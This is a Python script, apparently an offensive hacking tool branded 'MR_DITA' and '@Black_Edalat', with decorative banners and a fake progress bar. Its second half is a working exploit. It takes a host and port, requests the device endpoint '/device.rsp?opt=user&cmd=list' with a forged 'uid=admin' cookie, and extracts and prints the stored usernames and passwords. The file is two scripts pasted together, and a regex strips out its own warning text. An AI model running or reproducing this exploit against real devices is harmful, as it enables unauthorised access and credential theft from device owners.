import os
import time
from random import randint
from colorama import Fore, init
from prettytable import PrettyTable
import re

init(autoreset=True)

def show_menu():
    print("Welcome to the progress bar simulation!")

n = 0
r = ""

while n <= 100:
    print(r, f"{Fore.LIGHTRED_EX}%{n}")
    n += randint(1, 5)
    r += "="
    time.sleep(0.1)

time.sleep(3)
os.system("cls" if os.name == "nt" else "clear")

print(Fore.BLUE + "  https://t.me/Black_Edalat ")

print(Fore.LIGHTCYAN_EX + """
########:'########:::::'###::::'##::::::::::'###::::'########:
##.....:: ##.... ##:::'## ##::: ##:::::::::'## ##:::... ##..::
##::::::: ##:::: ##::'##:. ##:: ##::::::::'##:. ##::::: ##::::
######::: ##:::: ##:'##:::. ##: ##:::::::'##:::. ##:::: ##::::
##...:::: ##:::: ##: #########: ##::::::: #########:::: ##::::
##::::::: ##:::: ##: ##.... ##: ##::::::: ##.... ##:::: ##::::
########: ########:: ##:::: ##: ########: ##:::: ##:::: ##::::
........::........:::..:::::..::........::..:::::..:::::..:::::
""")
print('')
time.sleep(1)
print("")
print("")
print(f"{Fore.LIGHTYELLOW_EX}―――‣{Fore.LIGHTMAGENTA_EX} im MR_DITA")
time.sleep(0.4)
print(f"{Fore.LIGHTYELLOW_EX}―――――‣{Fore.LIGHTMAGENTA_EX} TakLorix ")
time.sleep(0.3)
print(f"{Fore.LIGHTYELLOW_EX}―――――――‣{Fore.LIGHTMAGENTA_EX} @Black_Edalat")
time.sleep(0.2)
print('')
print(Fore.BLUE + " ")

print(Fore.LIGHTRED_EX + """
  ⠀     ⣠⣶⣾⣾⣷⣷⣶⣄    
⠀⠀⠀⠀⠀⠀⣼⢏⣿⣿⣿⣿⣿⣿⣿⣧   
⠀⠀⠀⠀⠀⠀⣟⣼⠿⠻⣿⣿⠟⠿⣿⣿
⠀⠀⠀⠀⠀⠀⢣⣿⠀⣀⡿⣷⡀⢀⣯⠚⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣣⣼⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⣤⡄⠀⠀⢰⣎⢹⣛⢻⡛⣵⡂⠀⠀⠀⢀⣀⡀⠀⠀
⣾⣿⣿⣿⣦⡀⠀⠈⢿⣔⣔⣰⣠⡿⠀⠀⠀⣠⣾⣿⣿⣦⡀     
⠛⠛⠶⢯⣿⣿⣷⣦⣌⡙⠛⠛⠋⣀⣤⣶⣿⣿⣻⣯⠿⠿⠇    
⠀⠀⠀⠀⠀⠉⠛⠻⢿⣿⣶⣜⡿⡿⠿⠛⠉⠉⠀⠀⠀⠀⠀
⣠⣀⣄⣀⣄⣤⣴⣾⣿⠾⠝⠿⣿⣷⣦⣄⣀⡀⡀⠀   ⠀⠀⠀
⢿⣿⢿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠉⠛⠿⣟⣿⣿⣿⣿⣷⠀     
⠀⠀⠙⠓⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⠯⠿⠉
""")
print('')
# Define colors
lrd = "\033[91m"  # Red
cn = "\033[94m"   # Blue
lgn = "\033[92m"  # Green
gn = "\033[93m"   # Yellow

# Clean warning message
message = 'Warning! This is a test reporter, any offense is the responsibility of the user!'
cleaned_message = re.sub(r'Warning! This is a test reporter, any offense is the responsibility of the user!', '', message)
print(cleaned_message)

# Create table
t = PrettyTable([f'{cn}Number{lrd}', f'{cn}Info{lrd}'])
t.add_row([f'{lgn}1{lrd}', f'{gn}set IP>1{lrd}'])
t.add_row([f'{lgn}2{lrd}', f'{gn}set IP>2{lrd}'])
t.add_row([f'{lgn}3{lrd}', f'{gn}outside>3{lrd}'])

# Display table
print(t)
print('')
from colorama import Fore, init
init()
print(Fore.LIGHTWHITE_EX + " ")
site = input("┌─[IP@python]─[~]\n└──╼ ❯❯❯ ")
#!/bin/python

import os, requests, re, time
from colorama import Fore, Style

def banner():
    print(f"{Fore.YELLOW}Exploit Tool")
    print(f"{Fore.YELLOW}DITA {Fore.RED}: {Fore.GREEN}MR_DITA ")
    print(f"{Fore.YELLOW}Exploit {Fore.RED}: {Fore.WHITE}OK DITA ")
    print(f"{Fore.YELLOW}Github {Fore.RED}: MR_DATA ")
    from datetime import date
    today = date.today()
    print("Date:", today)

os.system('clear')

headers = {}
time.sleep(2)
banner()

time.sleep(1.5)
host = input(f"{Fore.GREEN}Host{Fore.WHITE}> ")
time.sleep(1.5)
port = input(f"{Fore.GREEN}Port{Fore.WHITE}> ")

os.system('clear')

forexe = (f"http://{host}:{port}/device.rsp?opt=user&cmd=list")
forchk = (f"http://{host}:{port}/")

def Headers(xCookie):
    headers["Host"]             =  forchk
    headers["User-Agent"]       = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
    headers["Accept"]           = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
    headers["Accept-Languag"]   = "es-AR,en-US;q=0.7,en;q=0.3"
    headers["Connection"]       = "close"
    headers["Content-Type"]     = "text/html"
    headers["Cookie"]           = "uid="+xCookie
    
    return headers

req = requests.get(forexe, headers=Headers(xCookie="admin"), timeout=10.000).text
user = re.findall(r'"uid":"(.*?)"', req)[0]
pswd = re.findall(r'"pwd":"(.*?)"', req)[0]


time.sleep(2)
banner()
time.sleep(1.5)
print(f"\n       {Fore.WHITE}- {Fore.YELLOW}Result {Fore.WHITE}-   ")
time.sleep(1)
print(f"{Fore.YELLOW} Execution :{Fore.RED} {host}:{port}")
time.sleep(1)
print(f"    {Fore.BLUE}[{Fore.GREEN}!{Fore.BLUE}] {Fore.YELLOW}Username : {Fore.WHITE}{user}")
time.sleep(1)
print(f"    {Fore.BLUE}[{Fore.GREEN}!{Fore.BLUE}] {Fore.YELLOW}Password : {Fore.WHITE}{pswd}")
